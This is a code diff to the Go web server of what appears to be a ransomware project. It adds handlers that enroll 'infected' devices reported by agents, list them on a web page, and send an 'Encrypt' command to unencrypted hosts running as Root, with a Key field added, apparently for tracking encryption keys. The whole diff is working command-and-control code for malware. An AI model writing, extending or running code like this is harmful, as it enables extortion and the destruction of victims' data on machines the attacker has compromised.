@@ -3,47 +3,71 @@ package Webserver
 import (
 	"encoding/json"
 	"fmt"
+	"html/template"
 	"io/ioutil"
 	"log"
 	"net/http"
 )
 
+var (
+	device  Enumeration
+	devices []Enumeration
+)
+
 type Enumeration struct {
-	ID       int      `json:"ID"`
-	Hostname string   `json:"Hostname"`
-	User     string   `json:"User"`
-	IP       []string `json:"IP"`
+	ID        int      `json:"ID"`
+	Hostname  string   `json:"Hostname"`
+	User      string   `json:"User"`
+	IP        []string `json:"IP"`
+	Encrypted bool
+	Key       string
 }
 
-func HomeHandler(writer http.ResponseWriter, request *http.Request) {
+//used for querying that webserver is running
+func HomeHandler(w http.ResponseWriter, r *http.Request) {
 	defaultMessage := []byte("Listening for incoming connections ")
-	_, err := writer.Write(defaultMessage)
+	_, err := w.Write(defaultMessage)
 	if err != nil {
 		log.Fatal(err)
 	}
-
-	//It will need to take incoming strings
 }
 
-func InfectedHandler(writer http.ResponseWriter, request *http.Request) {
-	//this is where registered devices are kept - receives the JSON
-	//eventually this should append to a database
-	//sends a command response - tied to Agent.RegisterHost()
+//listening for agents to enroll infected device (RegisterHost())
+func InfectedHandler(w http.ResponseWriter, r *http.Request) {
 
-	var device Enumeration
-	//receive the JSON
-	req, err := ioutil.ReadAll(request.Body)
+	req, err := ioutil.ReadAll(r.Body)
 	if err != nil {
 		log.Fatalf("Issue getting enumeration data from device: %s", err)
 	}
 	json.Unmarshal([]byte(req), &device)
 	log.Printf("Enrolled a new device: %d", device.ID)
+	device.Encrypted = false
+	devices = append(devices, device)
 
-	//placeholder, just print the struct
-	fmt.Println(device)
 }
 
-func CommandHandler(writer http.ResponseWriter, request *http.Request) {
+//user page to view enrolled devices
+func ViewInfected(w http.ResponseWriter, r *http.Request) {
+	t, err := template.ParseFiles("./pages/infected.gohtml")
+	if err != nil {
+		log.Fatalf("Issue with 'infected' html template: %s", err.Error())
+	}
+	t.Execute(w, devices)
+}
+
+func CommandHandler(w http.ResponseWriter, r *http.Request) {
 	//Reads the header of the request and issue commands
 	//Tied to Agent.KeepAlive()
+
+	fmt.Printf("Device %d requesting commands \n", device.ID)
+	if device.User == "Root" && !device.Encrypted {
+		w.WriteHeader(http.StatusOK)
+		command := []byte("Encrypt")
+		w.Write(command)
+		//TODO: update device.Encrypted = true
+
+	} else {
+		command := []byte("Wait")
+		w.Write(command)
+	}
 }
